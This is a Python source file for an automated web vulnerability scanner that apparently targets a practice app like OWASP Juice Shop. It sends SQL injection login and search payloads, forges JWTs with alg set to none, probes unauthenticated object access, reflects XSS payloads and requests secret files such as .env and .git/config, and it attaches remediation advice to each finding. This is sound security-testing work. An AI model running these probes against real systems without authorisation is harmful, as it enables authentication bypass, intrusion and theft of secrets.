"""
DirectVulnTester — deterministic, self-contained HTTP vulnerability tests.
No browser, no LLM, no recon data required.
"""

import asyncio
import base64
import json
import re

import httpx
from loguru import logger


class DirectVulnTester:
    """Run deterministic vulnerability tests against a target URL."""

    def __init__(self) -> None:
        self._findings: list[dict] = []

    async def run(self, target_url: str, run_id: str) -> list[dict]:
        """Execute all tests and return a list of finding dicts."""
        target_url = target_url.rstrip("/")
        self._findings = []

        async with httpx.AsyncClient(
            timeout=10.0, follow_redirects=False, verify=False
        ) as client:
            results = await asyncio.gather(
                self._test_directory_listing(client, target_url),
                self._test_sqli_login(client, target_url),
                self._test_sqli_search(client, target_url),
                self._test_jwt_alg_none(client, target_url),
                self._test_idor(client, target_url),
                self._test_xss_search(client, target_url),
                self._test_security_headers(client, target_url),
                self._test_stack_trace(client, target_url),
                self._test_sensitive_files(client, target_url),
                return_exceptions=False,
            )
        for batch in results:
            if batch:
                self._findings.extend(batch)
        return self._findings

    # ------------------------------------------------------------------ helpers

    def _finding(
        self,
        title: str,
        severity: str,
        endpoint: str,
        method: str,
        evidence: str,
        vuln_type: str,
        remediation: str,
    ) -> dict:
        logger.info(f"Found: {title} at {endpoint}")
        return {
            "title": title,
            "severity": severity,
            "endpoint": endpoint,
            "method": method,
            "evidence": evidence,
            "vuln_type": vuln_type,
            "remediation": remediation,
        }

    # ------------------------------------------------------------------ A: directory listing

    async def _test_directory_listing(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        paths = [
            "/ftp/", "/backup/", "/admin/", "/.git/", "/uploads/",
            "/files/", "/docs/", "/private/", "/data/", "/archive/",
        ]
        findings: list[dict] = []
        for path in paths:
            try:
                resp = await client.get(base + path)
                if resp.status_code == 200:
                    body = resp.text
                    if (
                        "Index of" in body
                        or "Directory listing" in body
                        or (
                            re.search(r'<a href="[^"]*\.[a-z]{2,4}"', body, re.I)
                            is not None
                        )
                    ):
                        findings.append(
                            self._finding(
                                title=f"Directory listing exposed: {path}",
                                severity="HIGH",
                                endpoint=base + path,
                                method="GET",
                                evidence=body[:300],
                                vuln_type="Information Disclosure",
                                remediation="Disable directory listing in the web server configuration.",
                            )
                        )
            except Exception as exc:
                logger.debug(f"_test_directory_listing {path}: {exc}")
        return findings

    # ------------------------------------------------------------------ B: SQLi login

    async def _test_sqli_login(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        login_paths = [
            "/api/Users/login", "/rest/user/login", "/api/auth/login",
            "/login", "/api/login", "/user/login", "/auth/login",
        ]
        payloads = [
            {"email": "' OR 1=1--", "password": "x"},
            {"email": "admin'--", "password": "x"},
            {"email": "test@test.com' OR '1'='1'--", "password": "x"},
        ]
        sql_errors = [
            "SQLITE_ERROR", "mysql_fetch", "ORA-", "syntax error",
            " near ", "Warning: mysql",
        ]
        findings: list[dict] = []
        for path in login_paths:
            url = base + path
            for payload in payloads:
                try:
                    resp = await client.post(
                        url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                    )
                    body = resp.text
                    triggered = False
                    reason = ""
                    if resp.status_code < 300:
                        triggered = True
                        reason = f"Login succeeded with SQL payload (status {resp.status_code})"
                    else:
                        for err in sql_errors:
                            if err in body:
                                triggered = True
                                reason = f"SQL error string '{err}' in response"
                                break
                    if triggered:
                        findings.append(
                            self._finding(
                                title="SQL Injection in login endpoint",
                                severity="CRITICAL",
                                endpoint=url,
                                method="POST",
                                evidence=f"Payload: {json.dumps(payload)} | Reason: {reason} | Body[:200]: {body[:200]}",
                                vuln_type="SQL Injection",
                                remediation="Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
                            )
                        )
                        break  # one finding per endpoint is enough
                except Exception as exc:
                    logger.debug(f"_test_sqli_login {url}: {exc}")
        return findings

    # ------------------------------------------------------------------ C: SQLi search

    async def _test_sqli_search(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        search_paths = [
            "/rest/products/search", "/api/search", "/search", "/api/products",
        ]
        sql_errors = [
            "SQLITE_ERROR", "mysql_fetch", "ORA-", "syntax error",
            " near ", "Warning: mysql",
        ]
        findings: list[dict] = []
        for path in search_paths:
            for q_suffix in ["apple'", "apple' OR 1=1--"]:
                url = f"{base}{path}?q={q_suffix}"
                try:
                    resp = await client.get(url)
                    body = resp.text
                    for err in sql_errors:
                        if err in body:
                            findings.append(
                                self._finding(
                                    title="SQL Injection in search parameter",
                                    severity="CRITICAL",
                                    endpoint=url,
                                    method="GET",
                                    evidence=f"SQL error '{err}' found in response body[:200]: {body[:200]}",
                                    vuln_type="SQL Injection",
                                    remediation="Use parameterised queries / prepared statements.",
                                )
                            )
                            break
                except Exception as exc:
                    logger.debug(f"_test_sqli_search {url}: {exc}")
        return findings

    # ------------------------------------------------------------------ D: JWT alg:none

    async def _test_jwt_alg_none(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        probe_paths = ["/rest/user/whoami", "/api/whoami", "/api/me"]
        protected_paths = ["/api/Users/", "/rest/user/whoami", "/api/admin"]
        findings: list[dict] = []

        token: str | None = None
        for path in probe_paths:
            try:
                resp = await client.get(base + path)
                auth_header = resp.request.headers.get("authorization", "")
                bearer_match = re.search(r"Bearer\s+([\w\-\.]+)", auth_header, re.I)
                if bearer_match:
                    token = bearer_match.group(1)
                    break
                # also check response body for a JWT-shaped string
                body_match = re.search(
                    r'"token"\s*:\s*"(eyJ[\w\-\.]+)"', resp.text
                )
                if body_match:
                    token = body_match.group(1)
                    break
            except Exception as exc:
                logger.debug(f"_test_jwt_alg_none probe {path}: {exc}")

        if not token:
            return findings

        # tamper: change alg to none, empty signature
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return findings
            header_bytes = base64.urlsafe_b64decode(parts[0] + "==")
            header_obj = json.loads(header_bytes)
            header_obj["alg"] = "none"
            new_header = base64.urlsafe_b64encode(
                json.dumps(header_obj, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            tampered_token = f"{new_header}.{parts[1]}."
        except Exception as exc:
            logger.debug(f"_test_jwt_alg_none tamper: {exc}")
            return findings

        for path in protected_paths:
            try:
                resp = await client.get(
                    base + path,
                    headers={"Authorization": f"Bearer {tampered_token}"},
                )
                if resp.status_code == 200:
                    findings.append(
                        self._finding(
                            title="JWT alg:none attack accepted",
                            severity="HIGH",
                            endpoint=base + path,
                            method="GET",
                            evidence=f"Tampered token accepted (alg=none), status 200. Body[:200]: {resp.text[:200]}",
                            vuln_type="Authentication Bypass",
                            remediation="Reject JWTs with alg=none. Always validate the algorithm server-side.",
                        )
                    )
            except Exception as exc:
                logger.debug(f"_test_jwt_alg_none protected {path}: {exc}")
        return findings

    # ------------------------------------------------------------------ E: IDOR

    async def _test_idor(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        paths = [
            "/rest/basket/1", "/rest/basket/2", "/rest/basket/3",
            "/api/basket/1", "/api/users/1", "/api/orders/1", "/api/orders/2",
        ]
        findings: list[dict] = []
        for path in paths:
            try:
                resp = await client.get(base + path)
                if resp.status_code == 200 and len(resp.text) > 20:
                    # Must look like data, not an error/redirect page
                    body_lower = resp.text.lower()
                    if not any(k in body_lower for k in ("not found", "unauthorized", "<html", "<!doctype")):
                        findings.append(
                            self._finding(
                                title=f"IDOR — unauthenticated access to {path}",
                                severity="HIGH",
                                endpoint=base + path,
                                method="GET",
                                evidence=f"200 response without auth. Body[:200]: {resp.text[:200]}",
                                vuln_type="IDOR",
                                remediation="Enforce ownership checks before returning resource data.",
                            )
                        )
            except Exception as exc:
                logger.debug(f"_test_idor {path}: {exc}")
        return findings

    # ------------------------------------------------------------------ F: XSS search

    async def _test_xss_search(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        payloads = [
            "<img src=x onerror=alert(1)>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]
        path = "/rest/products/search"
        findings: list[dict] = []
        for payload in payloads:
            url = f"{base}{path}?q={payload}"
            try:
                resp = await client.get(url)
                # Check for unencoded reflection of the raw payload
                decoded_payload = payload.replace("%3C", "<").replace("%3E", ">").replace("%2F", "/")
                if decoded_payload in resp.text or payload in resp.text:
                    findings.append(
                        self._finding(
                            title="Reflected XSS in search parameter",
                            severity="MEDIUM",
                            endpoint=url,
                            method="GET",
                            evidence=f"Payload reflected unencoded in response. Payload: {payload}",
                            vuln_type="XSS",
                            remediation="HTML-encode all user-controlled output; apply a Content-Security-Policy.",
                        )
                    )
            except Exception as exc:
                logger.debug(f"_test_xss_search {url}: {exc}")
        return findings

    # ------------------------------------------------------------------ G: security headers

    async def _test_security_headers(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Content-Security-Policy",
            "Strict-Transport-Security",
        ]
        findings: list[dict] = []
        try:
            resp = await client.get(base + "/")
            present = {h.lower() for h in resp.headers.keys()}
            for header in required_headers:
                if header.lower() not in present:
                    findings.append(
                        self._finding(
                            title=f"Missing security header: {header}",
                            severity="LOW",
                            endpoint=base + "/",
                            method="GET",
                            evidence=f"Header '{header}' absent from response headers.",
                            vuln_type="Security Misconfiguration",
                            remediation=f"Add the '{header}' response header to all HTTP responses.",
                        )
                    )
        except Exception as exc:
            logger.debug(f"_test_security_headers: {exc}")
        return findings

    # ------------------------------------------------------------------ H: stack trace disclosure

    async def _test_stack_trace(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        paths = ["/api/", "/rest/", "/api"]
        nodejs_patterns = [
            r"Error:",
            r"\bstack\b",
            r"at Object\.",
            r"at Module\.",
            r"Error\n\s+at ",
        ]
        findings: list[dict] = []
        for path in paths:
            try:
                resp = await client.get(base + path)
                body = resp.text
                for pat in nodejs_patterns:
                    if re.search(pat, body):
                        findings.append(
                            self._finding(
                                title=f"Stack trace / verbose error disclosure at {path}",
                                severity="MEDIUM",
                                endpoint=base + path,
                                method="GET",
                                evidence=f"Pattern '{pat}' matched. Body[:300]: {body[:300]}",
                                vuln_type="Information Disclosure",
                                remediation="Disable verbose error output in production. Return generic error messages.",
                            )
                        )
                        break  # one finding per path
            except Exception as exc:
                logger.debug(f"_test_stack_trace {path}: {exc}")
        return findings

    # ------------------------------------------------------------------ I: sensitive file exposure

    async def _test_sensitive_files(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict]:
        paths = [
            "/.env", "/.env.local", "/config.json", "/config.yml",
            "/database.yml", "/secrets.json", "/application.properties",
            "/.git/config", "/package.json", "/composer.json",
        ]
        findings: list[dict] = []
        for path in paths:
            try:
                resp = await client.get(base + path)
                if resp.status_code == 200 and len(resp.text) > 50:
                    body = resp.text
                    looks_like_config = (
                        "=" in body or ":" in body or "{" in body
                    )
                    is_login_redirect = len(body) < 100 and (
                        "login" in body.lower() or "redirect" in body.lower()
                    )
                    if looks_like_config and not is_login_redirect:
                        findings.append(
                            self._finding(
                                title=f"Sensitive file exposed: {path}",
                                severity="HIGH",
                                endpoint=base + path,
                                method="GET",
                                evidence=f"Status 200. Body[:200]: {body[:200]}",
                                vuln_type="Sensitive Data Exposure",
                                remediation="Block public access to configuration and secret files via web server rules.",
                            )
                        )
            except Exception as exc:
                logger.debug(f"_test_sensitive_files {path}: {exc}")
        return findings


# --------------------------------------------------------------------------- module-level helper

async def run_direct_vuln_tests(
    target_url: str, run_id: str, output_dir: str = "outputs"
) -> list[dict]:
    """Instantiate DirectVulnTester, run all tests, and return findings."""
    tester = DirectVulnTester()
    findings = await tester.run(target_url=target_url, run_id=run_id)
    if findings:
        import pathlib
        out_path = pathlib.Path(output_dir) / "reports" / "json" / "direct_vuln_findings.json"
        try:
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_text(json.dumps(findings, indent=2))
            logger.info(f"Direct vuln findings written to {out_path}")
        except Exception as exc:
            logger.debug(f"Could not write direct vuln findings: {exc}")
    return findings
